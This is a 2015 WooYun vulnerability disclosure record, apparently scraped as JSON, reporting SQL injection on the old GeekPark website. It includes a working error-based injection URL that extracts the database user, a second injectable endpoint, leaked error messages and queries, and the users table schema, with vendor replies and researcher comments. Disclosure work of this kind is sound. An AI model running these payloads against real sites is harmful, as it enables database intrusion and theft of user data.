{"id": 47624, "wybug_id": "wooyun-2015-092590", "wybug_title": "极客公园官方网站SQL注射漏洞包", "wybug_corp": "geekpark.net", "wybug_author": "猪猪侠", "wybug_date": "2015-01-18 22:27", "wybug_open_date": "2015-01-19 10:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-19：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 打个包，免得你们又说我刷分毁我形象，哎，还是没打偏 详细说明：  #1 注入1http://old.geekpark.net/ajax/share_plusguid=210714 and UpdateXML(1,CONCAT(0x5b,mid((SELECT user()),1,32),0x5d),1)&item=sina\nA Database Error OccurredError Number: 1105XPATH syntax error: '[geek_event@localhost]'UPDATE core_extra_entities SET `sina`=`sina`+1 WHERE guid=210714 and UpdateXML(1,CONCAT(0x5b,mid((SELECT user()),1,32),0x5d),1)Filename: /data/www/event.geekpark.net/models/entity_mod.phpLine Number: 50\n#2 注入2http://old.geekpark.net/tags/searchtag_name=123&limit=10，两个参数都可以注入\nA Database Error OccurredError Number: 1064You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'yes' ORDER BY ce.guid DESC LIMIT 10', 10' at line 12SELECT tr.entity_guid, ce.subtype_id, ce.title, FROM_UNIXTIME(e.time_created, '%Y-%m-%d %H:%i:%s' ) time_updated, u.guid, u.screen_name, u.username, c.highlight, s.abstract FROM tag_relations tr LEFT OUTER JOIN core_entities ce ON tr.entity_guid = ce.guid LEFT OUTER JOIN entities e ON ce.guid = e.guid LEFT OUTER JOIN users u ON e.user_guid = u.guid LEFT OUTER JOIN clips c ON c.guid=ce.guid LEFT OUTER JOIN seed s ON s.guid=ce.guid WHERE tag_id = ( SELECT guid FROM core_entities WHERE subtype_id =6 AND title = '123'' LIMIT 1 ) AND visibility='yes' ORDER BY ce.guid DESC LIMIT 10', 10;Filename: /data/www/event.geekpark.net/models/tag_mod.phpLine Number: 231\n   漏洞证明：  用户数据库\nDatabase: geekparkTable: users[47 columns]+-----------------+--------------------------------------------+| Column          | Type                                       |+-----------------+--------------------------------------------+| position        | varchar(50)                                || achievement     | text                                       || activation_key  | varchar(32)                                || address         | varchar(100)                               || bio             | varchar(2000)                              || birthday        | varchar(50)                                || blog            | varchar(100)                               || career          | text                                       || city            | varchar(100)                               || company         | varchar(100)                               || company_website | varchar(100)                               || current_level   | int(11)                                    || custom_name     | varchar(50)                                || education       | text                                       || email           | varchar(64)                                || fax             | varchar(30)                                || first_login     | int(10) unsigned                           || gender          | int(11)                                    || gplus           | varchar(2000)                              || group_id        | smallint(5) unsigned                       || guid            | int(10) unsigned                           || industry        | varchar(200)                               || interests       | varchar(200)                               || is_recommend    | int(11) unsigned                           || last_ip         | varchar(15)                                || mobilephone     | varchar(50)                                || notice_notify   | int(10) unsigned                           || password        | varchar(32)                                || qr_code         | varchar(32)                                || real_name       | varchar(60)                                || salt            | varchar(8)                                 || score           | int(10) unsigned                           || screen_name     | varchar(60)                                || signature       | varchar(200)                               || sina_uid        | int(11)                                    || skills          | varchar(200)                               || status          | enum('active','inactive','banned','guest') || sync_setting    | text                                       || tel             | varchar(32)                                || tempass         | varchar(32)                                || tempemail       | varchar(50)                                || unique_id       | varchar(32)                                || user_url        | varchar(50)                                || username        | varchar(32)                                || weibo_url       | varchar(200)                               || wx_open_id      | varchar(64)                                || zdl_data        | varchar(2000)                              |+-----------------+--------------------------------------------+\n#证明1\n\n#证明2\n\n   修复方案：  过滤   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-01-18 22:33 厂商回复： 哈哈，今天极客公园真是热闹啊。不过还是谢谢你们了 最新状态： 2015-01-19：因为 old 等是暂停使用的站点。现已将历史版本下线，待修复后上线  ", "replys": "漏洞评价：\n评论\n     2015-01-18 22:28 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  你关注的白帽子 猪猪侠 发表了漏洞 极客公园官方网站SQL注射漏洞包    \n     2015-01-18 22:31 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  我R  我还有两个极客的没审核~~    \n     2015-01-18 22:31 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  为啥要打包？？     \n     2015-01-18 22:33 |    \t\t天地不仁 以万物为刍狗 \t\t\t( 普通白帽子  |\t\t\t        Rank:977 漏洞数:264        | 天地本不仁 万物为刍狗)\t\t \n  留言2015-01-18 22:28| 222.216.190.35我是前来等待认领的继续求审核前排求审核:http://wooyun.org/bugs/wooyun-2015-092535/trace/4bb99d447c56637d00b8254e93c45353    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}